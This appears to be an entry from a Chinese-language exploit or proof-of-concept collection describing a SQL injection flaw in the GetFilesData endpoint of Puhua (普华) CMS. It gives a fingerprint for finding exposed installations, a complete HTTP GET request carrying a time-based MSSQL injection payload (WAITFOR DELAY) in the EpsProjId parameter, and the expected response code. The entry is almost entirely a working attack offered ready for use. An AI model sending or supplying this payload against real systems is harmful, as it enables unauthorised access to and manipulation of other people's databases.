# 普华CMSGetFilesData存在SQL注入漏洞

普华 ｜ SQL注入 ｜ —
- **指纹**：`body="Power.login.init"`
- **请求**：`GET /UploadFle/GetFilesData?EpsProjId=1%27;WAITFOR+DELAY+%270:0:5%27--&StartDate=2&EndDate=2 HTTP/1.1`
- **响应特征**：200